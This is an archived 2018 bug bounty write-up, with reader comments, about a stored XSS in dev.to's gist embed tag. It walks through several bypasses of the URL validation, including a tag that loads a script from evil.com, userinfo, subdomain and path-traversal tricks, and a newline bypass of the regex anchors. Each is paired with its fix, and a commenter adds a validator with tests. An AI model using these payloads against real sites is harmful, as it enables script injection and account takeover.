---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-08-31_pwned-together-hacking-devto.md
original_filename: 2018-08-31_pwned-together-hacking-devto.md
title: 'Pwned Together: Hacking dev.to'
category: documents
detected_topics:
- xss
- command-injection
- mfa
- api-security
- cloud-security
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- mfa
- api-security
- cloud-security
- mobile-security
language: en
raw_sha256: 758e39e56beed95fba34db4da7046039bfd1142668f04517ed9573c711f101af
text_sha256: dbcf1adf92d12c9af492fa20c6e32111c08a7e1144307a657de8fe90dc42a18d
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Pwned Together: Hacking dev.to

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-08-31_pwned-together-hacking-devto.md
- Source Type: markdown
- Detected Topics: xss, command-injection, mfa, api-security, cloud-security, mobile-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `758e39e56beed95fba34db4da7046039bfd1142668f04517ed9573c711f101af`
- Text SHA256: `dbcf1adf92d12c9af492fa20c6e32111c08a7e1144307a657de8fe90dc42a18d`


## Content

---
title: "Pwned Together: Hacking dev.to"
page_title: "Pwned Together: Hacking dev.to - DEV Community"
url: "https://dev.to/antogarand/pwned-together-hacking-devto-hkd"
final_url: "https://dev.to/antogarand/pwned-together-hacking-devto-hkd"
authors: ["Antony Garand (@AntoGarand)"]
programs: ["Dev.to"]
bugs: ["Stored XSS"]
bounty: "150"
publication_date: "2018-08-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5728
---

[ ![Cover image for Pwned Together: Hacking dev.to](https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fthepracticaldev.s3.amazonaws.com%2Fi%2F1v994a3aqftugutehys5.png) ](https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fthepracticaldev.s3.amazonaws.com%2Fi%2F1v994a3aqftugutehys5.png)

[![Antony Garand](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg)](/antogarand)

[Antony Garand](/antogarand)

Posted on Aug 31, 2018

![](https://assets.dev.to/assets/sparkle-heart-5f9bee3767e18deb1bb725290cb151c25234768a0e9a2bd39370c382d02920cf.svg) ![](https://assets.dev.to/assets/multi-unicorn-b44d6f8c23cdd00964192bedc38af3e82463978aa611b4365bd33a0f1f4f3e97.svg) ![](https://assets.dev.to/assets/exploding-head-daceb38d627e6ae9b730f36a1e390fca556a4289d5a41abb2c35068ad3e2c4b5.svg) ![](https://assets.dev.to/assets/raised-hands-74b2099fd66a39f2d7eed9305ee0f4553df0eb7b4f11b01b6b1b499973048fe5.svg) ![](https://assets.dev.to/assets/fire-f60e7a582391810302117f987b22a8ef04a2fe0df7e3258a5f49332df1cec71e.svg)

#  Pwned Together: Hacking dev.to 

[#security](/t/security) [#writeup](/t/writeup) [#xss](/t/xss)

#  Intro 

After reading this great post regarding the source of Dev.to, I got inspired.  
In order to celebrate my 500th follower on here, I gave myself the challenge to hack dev.to!  

[ ![joshcheek](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) ](/joshcheek) ## [This website is open source Josh Cheek ・ Aug 21 '18 #opensource ](/joshcheek/this-website-is-open-source-3db4)

In the end, I found a stored XSS in a custom liquid tag. This means that if you viewed an infected blog post, I could have controlled your browser, and execute actions on your behalf!

#  Context 

An XSS is a flaw in which a malicious user, in this case _me_ , can inject javascript code into the page.  
With JavaScript, specially in a single page application, I can do pretty much anything with your account on this website!

I could update your profile, publish new posts, like and comment on publications, and much more!  
  
Having an XSS means I have full control of the website from the browser's perspective, and therefore is a pretty severe issue.

There are different type of XSS: 

  * Reflected XSS: Requires the user to access a malicious link to be triggered. This means you would need to be redirected or to click a link in order for the exploit to be triggered.
  * Stored XSS: This is an XSS which is saved on the server, and therefore is presented by the website itself. This is the case of a specially crafted blog post. It is a lot more severe as it can be triggered by normal user behavior, and replicated for everyone.

As an example, a stored XSS was found on [TweetDeck](https://tweetdeck.twitter.com/) few years ago, where the malicious code was retweeting itself and ended up with a ridiculous amount of retweets:  

#  Vulnerability 

##  Original code 

As mentioned on the [Editor Guide](https://dev.to/p/editor_guide), there are many custom Liquid Tags implemented in here. One of those was newly created by Josh in the mentioned blog post, so I decided to start there to check out for security issues!

The source for these liquid tags live under [/app/liquid_tags](https://github.com/thepracticaldev/dev.to/tree/master/app/liquid_tags/) folder.  
Quickly, the [gist](https://github.com/thepracticaldev/dev.to/blob/e588fa7ece36d2c5aa398ba5eedee6b9d60b0818/app/liquid_tags/gist_tag.rb) interested me: The given tag was rendered directly into a script tag!  

  
  
  html = <<~HTML
  <div class="ltag_gist-liquid-tag">
  <script id="gist-ltag" src="#{@link}.js"></script>
  </div>
  HTML
  

And there were many workarounds for its validation:  

  
  
  def valid_link?(link)
  link.include?("gist.github.com")
  end
  

The usage for the `gist` link is the following in the [documentation](https://dev.to/p/editor_guide):  

  
  
  {% gist https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa %}
  

Adding `.js` gives us a script which creates a pretty embed around the content of the gist:

As the validation was not sufficient, only checking if the link contained `gist.github.com`, it could be bypassed:

`{% gist //evil.com/script#gist.github.com %}` would be converted into `<script src="//evil.com/script#gist.github.com.js"></script>`  
The previous gist would therefore load an unsafe script on the blog post, making it a stored xss!

Once the dev.team was notified, they quickly released [a patch](https://github.com/thepracticaldev/dev.to/blob/b1f6587a3a3f49ae04dd3b0811e412c02d336672/app/liquid_tags/gist_tag.rb) by updating the `valid_link` function:  

  
  
  def valid_link?(link)
  (link =~ /(http|https):\/\/(gist.github.com).*/)&.zero?
  end
  

##  Bypass 1 

This patch ensured that the given link started with `http[s]://gist.github.com`.  
While better than the previous validation, this is still not sufficient to protect against attacks!

The following two domains would pass this validation, but still load an external script:

  * <https://gist.github.com@evil.com/>
  * <http://gist.github.com.evil.com/>

The first one uses the [Basic Authentication Scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#Basic_authentication_scheme) and sends `gist.github.com` as username to the `evil.com` website. 

The second one is simply a subdomain of `evil.com`.

This issue was quickly fixed by adding a required trailing slash after `gist.github.com`, which correctly mitigates this issue.  

  
  
  def valid_link?(link)
  (link =~ /^(http(s)?:)?\/\/(gist.github.com)\/.*/)&.zero?
  end
  

##  Bypass 2 

The previous patch made sure that the domain requested was `gist.github.com`, which is great!  
  
But there still was a bypass possible due to the nature of the website.

When viewing raw gist files, in this case [poc.js](https://gist.github.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab), the raw link is from the following format: `https://gist.githubusercontent.com/[name]/[gistid]/raw/[fileid]/[filename.ext]`

When replacing the domain `gist.githubusercontent.com` with `gist.github.com`, we are actually redirected to the original `githubusercontent.com` domain!  
This means that the raw file `poc.js` from my gist can be accessed from:  
\- <https://gist.githubusercontent.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab/raw/4deb366ddaf0597e82fea808f7f4cb3ad763d98f/poc.js>  
\- <https://gist.github.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab/raw/4deb366ddaf0597e82fea808f7f4cb3ad763d98f/poc.js>

Notice the domain on the second URL: **gist.github.com**

This correctly bypasses the given patch as the raw file would be served from the **gist.github.com** domain.

The patch was successfully applied earlier today, by forcing the given gist to a more strict regex: [Commit](https://github.com/thepracticaldev/dev.to/commit/b99566afb397106fedc97ce53d5496a038e4e0c5)  

  
  
  def valid_link?(link)
  (link =~ /^https\:\/\/gist\.github\.com\/([a-zA-Z0-9\-]){1,39}\/([a-zA-Z0-9]){32}\s/)&.
  zero?
  end
  

#  Conclusion 

After disclosing the original bug, following the [dev.to bug bounty program](https://dev.to/security), the dev team was quick to react and patch those bugs.  
I managed to earn myself a place in the security hall of fame, a sweet 150$ bounty and a [pack of stickers](https://shop.dev.to/collections/frontpage/products/sticker-pack).

By having the source code available and a bug bounty program, many more people will scan the websites for issues, which makes the website more secure.

Finally, the overall experience has been great!  
I would strongly recommend everyone to checkout the source code, report bugs and security issues you find and submit pull requests improving the general security of the website.

If you're looking for somewhere to start, your first commit could be as simple as [replacing http links with https](https://github.com/thepracticaldev/dev.to/commit/e7a0911b81fad8851a2168aa5ad479ff3350a5d3)!

##  Top comments (22)

Subscribe

![pic](https://media2.dev.to/dynamic/image/width=256,height=,fit=scale-down,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F8j7kvp660rqzt99zui8e.png)

Personal Trusted User

[ Create template ](/settings/response-templates)

Templates let you quickly answer FAQs or store snippets for re-use.

Submit Preview [Dismiss](/404.html)

[ ![ben profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1%2Fbabb96d0-9cd2-49bc-a412-2dc4caf94c2a.png) ](https://dev.to/ben)

[ Ben Halpern  ](https://dev.to/ben)

Ben Halpern [![Subscriber](https://assets.dev.to/assets/subscription-icon-805dfa7ac7dd660f07ed8d654877270825b07a92a03841aa99a1093bd00431b2.png)](/++)

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1%2Fbabb96d0-9cd2-49bc-a412-2dc4caf94c2a.png) Ben Halpern ![](https://assets.dev.to/assets/subscription-icon-805dfa7ac7dd660f07ed8d654877270825b07a92a03841aa99a1093bd00431b2.png) ](/ben)

Follow

A Canadian software developer who thinks he’s funny. 

  * Email 

[ben@forem.com](mailto:ben@forem.com)

  * Location 

NY 

  * Education 

Mount Allison University 

  * Pronouns 

He/him 

  * Work 

Co-founder at Forem 

  * Joined 

Dec 27, 2015

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-569h)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-569h)
  *  * Hide 
  *  *  * 

Thanks for your awesome work. I promise we’ll keep upping the bug bounty program as we go, so keep up with the disclosures!

21 likes Like  Reply

[ ![michaelgv profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F36783%2Fd4c579fb-81fa-46d1-a5f4-1ccce1a0e6ff.png) ](https://dev.to/michaelgv)

[ Mike  ](https://dev.to/michaelgv)

Mike 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F36783%2Fd4c579fb-81fa-46d1-a5f4-1ccce1a0e6ff.png) Mike  ](/michaelgv)

Follow

Full-time freelancer; Former Lead Engineer / Senior Management; speaker; 14 years in development; open for consulting and freelance opportunities. 

  * Location 

Canada 

  * Work 

Founder / CEO 

  * Joined 

Oct 11, 2017

• [ Sep 3 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-588j)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-588j)
  *  * Hide 
  *  *  * 

Is there a hackerone-style disclosure program? 

1 like Like  Reply

[ ![defman profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1041%2F12a603f9-c189-4df5-bbf2-237410627781.gif) ](https://dev.to/defman)

[ Sergey Kislyakov  ](https://dev.to/defman)

Sergey Kislyakov 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1041%2F12a603f9-c189-4df5-bbf2-237410627781.gif) Sergey Kislyakov  ](/defman)

Follow

  * Location 

Russia 

  * Work 

Backend Engineer 

  * Joined 

Jan 2, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56cg)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56cg)
  *  * Hide 
  *  *  * 

[@ben](https://dev.to/ben) , isn't there an URI class or something like that in Ruby? I think it should handle parsing links much better than custom regex.

2 likes Like  Reply

[ ![rhymes profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F2693%2Fbfd9a4a5-92b3-4ac3-a276-3ccb68d78203.jpg) ](https://dev.to/rhymes)

[ rhymes  ](https://dev.to/rhymes)

rhymes 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F2693%2Fbfd9a4a5-92b3-4ac3-a276-3ccb68d78203.jpg) rhymes  ](/rhymes)

Follow

Such software as dreams are made on. I mostly rant about performance, unnecessary complexity, privacy and data collection. 

  * Joined 

Feb 2, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56dl)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56dl)
  *  * Hide 
  *  *  * 

Probably you can slightly simplify the code using [URI::regexp](https://joshmcarthur.com/til/2018/05/23/uri-regexp-in-ruby.html), is this what you mean?

1 like Like  Reply

[ ![defman profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1041%2F12a603f9-c189-4df5-bbf2-237410627781.gif) ](https://dev.to/defman)

[ Sergey Kislyakov  ](https://dev.to/defman)

Sergey Kislyakov 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F1041%2F12a603f9-c189-4df5-bbf2-237410627781.gif) Sergey Kislyakov  ](/defman)

Follow

  * Location 

Russia 

  * Work 

Backend Engineer 

  * Joined 

Jan 2, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56e3)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56e3)
  *  * Hide 
  *  *  * 

Kinda. I think Ruby provides something like:
  
  
  # pseudocode
  link = URI.parse "http://evil.com/#gist.github.com/whatever"
  link.host # evil.com
  

1 like Like  Thread 

[ ![andy profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) ](https://dev.to/andy)

[ Andy Zhao (he/him)  ](https://dev.to/andy)

Andy Zhao (he/him) 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) Andy Zhao (he/him)  ](/andy)

Follow

uh oh where'd my bio go! 

  * Education 

Actualize Coding Bootcamp 

  * Joined 

Mar 28, 2017

• [ Aug 31 '18  • Edited on Aug 31 • Edited ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56ip)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56ip)
  *  * Hide 
  *  *  * 

This would work for preventing non-`gist-github.com` hosts, but I think we strayed away from this because it wouldn't prevent Bypass 2, where JS is injected via a raw gist link. 

We could do something like this:
  
  
  URI.parse(link).host == "gist.github.com" &&
  (link =~ /^https\:\/\/gist\.github\.com\/([a-zA-Z0-9\-]){1,39}\/([a-zA-Z0-9]){32}\s/)
  &.zero?
  

I think with the regex though it would be redundant to check the host.

2 likes Like  Thread 

[ ![joshcheek profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) ](https://dev.to/joshcheek)

[ Josh Cheek  ](https://dev.to/joshcheek)

Josh Cheek 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) Josh Cheek  ](/joshcheek)

Follow

  * Joined 

Dec 12, 2016

• [ Sep 3 '18  • Edited on Sep 3 • Edited ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58h0)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58h0)
  *  * Hide 
  *  *  * 

How about something like this?
  
  
  require 'uri'
  
  def valid?(link)
  uri = URI.parse link
  return false if uri.scheme != 'https'
  return false if uri.userinfo
  return false if uri.host != 'gist.github.com'
  return false if uri.port != 443 # I think it has to be this if its https?
  return false if uri.fragment
  return false if uri.query
  
  # idk if old gist ids could be arbitrary chars,
  # but the 10 or so I looked at all seemed to be hex
  path, gist = File.split uri.path
  return false unless gist && gist.match?(/\A[0-9a-f]{32}\z/)
  
  path, user = File.split path
  return false unless user && user.match?(/\A[a-zA-Z0-9\-]{1,39}\z/)
  
  path == '/'
  end
  

Plus, a bunch of test cases:
  
  
  valid = [
  # suggested one
  "https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa",
  # max name size (based on the existing regex, I didn't verify that it matches Github's rules)
  "https://gist.github.com/aaaaaaaaaabbbbbbbbbbccccccccccddddddddd/4bb1682ce590dc42402b2edddbca7aaa",
  # min name size
  "https://gist.github.com/a/4bb1682ce590dc42402b2edddbca7aaa",
  # each of the gist id char values (seems to be hex)
  "https://gist.github.com/a/0123456789abcdef0123456789abcdef",
  # user can have a dash in their name
  "https://gist.github.com/quincy-larson/4bb1682ce590dc42402b2edddbca7aaa",
  # just for contrast with some of the tests below
  "https://gist.github.com/a/0000000000111111111122222222223a",
  ]
  
  invalid = [
  # the same as the valid one, except it's http. I actually thought browsers
  # would refuse to make http requests from https sites, but either way, it
  # should be disallowed as it's MITMable
  "http://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa",
  # host
  "https://evil.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa",
  # auth credentials
  "https://user:pass@gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa",
  # http port (not totally sure this matters)
  "https://gist.github.com:80/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa",
  # query
  "https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa?q",
  # fragment
  "https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa#f",
  # this one exceeds the max name size
  "https://gist.github.com/aaaaaaaaaabbbbbbbbbbccccccccccddddddddde/4bb1682ce590dc42402b2edddbca7aaa",
  # less than min name size
  "https://gist.github.com//4bb1682ce590dc42402b2edddbca7aaa",
  # invalid gist id chars (outside the hex range)
  "https://gist.github.com/a/0000000000111111111122222222223x",
  # quick test showed that GH was case sensitive about the hex in the gist id
  "https://gist.github.com/a/0000000000111111111122222222223A",
  # too few path segments
  "https://gist.github.com",
  "https://gist.github.com/",
  "https://gist.github.com/a",
  # too many path segments
  "https://gist.github.com/QuincyLarson/4bb1682ce590dc42402b2edddbca7aaa/4bb1682ce590dc42402b2edddbca7aaa",
  # these ones were used to bypass validity in the blog
  "//evil.com/script#gist.github.com",
  "https://gist.github.com@evil.com/",
  "https://gist.github.com/AntonyGarand/a8a0b4a36a040edc6051e888afce8fab/raw/4deb366ddaf0597e82fea808f7f4cb3ad763d98f/poc.js",
  ]
  
  valid.all?  { |link| valid? link } # => true
  invalid.none? { |link| valid? link } # => true
  

1 like Like  Thread 

[ ![joshcheek profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) ](https://dev.to/joshcheek)

[ Josh Cheek  ](https://dev.to/joshcheek)

Josh Cheek 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F707%2F77495.jpeg) Josh Cheek  ](/joshcheek)

Follow

  * Joined 

Dec 12, 2016

• [ Sep 3 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58h4)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58h4)
  *  * Hide 
  *  *  * 

Although, we should probably check whether you're allowed to have unicode in your username 🤔

1 like Like  Thread 

[ ![andy profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) ](https://dev.to/andy)

[ Andy Zhao (he/him)  ](https://dev.to/andy)

Andy Zhao (he/him) 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) Andy Zhao (he/him)  ](/andy)

Follow

uh oh where'd my bio go! 

  * Education 

Actualize Coding Bootcamp 

  * Joined 

Mar 28, 2017

• [ Oct 12 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-65g6)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-65g6)
  *  * Hide 
  *  *  * 

[@joshcheek](https://dev.to/joshcheek) gonna take that `valid?` method for checking giphy links. :)

2 likes Like  Thread 

[ ![andy profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) ](https://dev.to/andy)

[ Andy Zhao (he/him)  ](https://dev.to/andy)

Andy Zhao (he/him) 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F13962%2F7b253794-1b63-42e1-803d-acff30cc08f4.jpeg) Andy Zhao (he/him)  ](/andy)

Follow

uh oh where'd my bio go! 

  * Education 

Actualize Coding Bootcamp 

  * Joined 

Mar 28, 2017

• [ Oct 12 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-65gk)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-65gk)
  *  * Hide 
  *  *  * 

Also that's pretty great. Might end up implementing it for the gist Liquid tag.

2 likes Like  Reply

[ ![n1nj4sec profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F97980%2F0ec4ea36-cb71-48ac-98f2-ad9e3eb59dd6.png) ](https://dev.to/n1nj4sec)

[ Nicolas Verdier  ](https://dev.to/n1nj4sec)

Nicolas Verdier 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F97980%2F0ec4ea36-cb71-48ac-98f2-ad9e3eb59dd6.png) Nicolas Verdier  ](/n1nj4sec)

Follow

  * Location 

http:///plop"><

  * Joined 

Sep 3, 2018

• [ Sep 4 '18  • Edited on Sep 4 • Edited ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58jm)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58jm)
  *  * Hide 
  *  *  * 

Nice finding Antony,  
For your information, the latest commit was still exploitable :) here is the poc to bypass the regex :  
[gist.github.com/n1nj4sec/9fc83e8bc...](https://gist.github.com/n1nj4sec/9fc83e8bc780e5c10739933ec3347460) /../9fc83e8bc780e5c10739933ec3347460/raw/b46eef9822a00473f720680ed664873c3e20af9f/test.js" (the trick is to use /../)  
and the fix implemented :  
[github.com/thepracticaldev/dev.to/...](https://github.com/thepracticaldev/dev.to/commit/dcb73a7009317d4ec46da2fc20e765c0a480cd98)

2 likes Like  Reply

[ ![antogarand profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) ](https://dev.to/antogarand)

[ Antony Garand  ](https://dev.to/antogarand)

Antony Garand 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) Antony Garand  ](/antogarand)

Follow

Security enthusiast, FullStack developer, challenge solver 

  * Joined 

Jun 9, 2018

• [ Sep 14 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-5fkk)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-5fkk)
  *  * Hide 
  *  *  * 

This patch was also vulnerable ;)

As the regex ended with `$`, we could bypass it with a newline, then `/../../..` \+ raw gist 

[github.com/thepracticaldev/dev.to/...](https://github.com/thepracticaldev/dev.to/commit/ff9d2c7f7a9653006473ff3ca96b4121988104bc)

This was fixed by using `\A` and `\Z` instead of `^` and `$`!

2 likes Like  Reply

[ ![antogarand profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) ](https://dev.to/antogarand)

[ Antony Garand  ](https://dev.to/antogarand)

Antony Garand 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F77692%2F42cc26a2-feb1-42cc-9dbe-7df4f85f9e48.jpg) Antony Garand  ](/antogarand)

Follow

Security enthusiast, FullStack developer, challenge solver 

  * Joined 

Jun 9, 2018

• [ Sep 4 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58pe)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-58pe)
  *  * Hide 
  *  *  * 

Nice one!

1 like Like  Reply

[ ![gary_woodfine profile image](https://media2.dev.to/dynamic/image/width=50,height=50,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F15256%2Fa01094f3-1bf4-4935-a388-085f14e33809.jpg) ](https://dev.to/gary_woodfine)

[ Gary Woodfine  ](https://dev.to/gary_woodfine)

Gary Woodfine 

[ ![](https://media2.dev.to/dynamic/image/width=90,height=90,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F15256%2Fa01094f3-1bf4-4935-a388-085f14e33809.jpg) Gary Woodfine  ](/gary_woodfine)

Follow

Software Developer Specialising in the C#, .NET Core and related ecosystems 

  * Location 

United Kingdom 

  * Education 

University of Life 

  * Work 

CTO at threenine.io 

  * Joined 

Apr 5, 2017

• [ Aug 31 '18  ](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56fe)

  * [Copy link](https://dev.to/antogarand/pwned-together-hacking-devto-hkd#comment-56fe)
  *  * Hide 
  *  *  * 

What an excellent post! 

I learned so much from this, and I'm not even a ruby developer!

Really informative and really, really well explained without going over the top with the geekness!

Well done!

2 likes Like  Reply

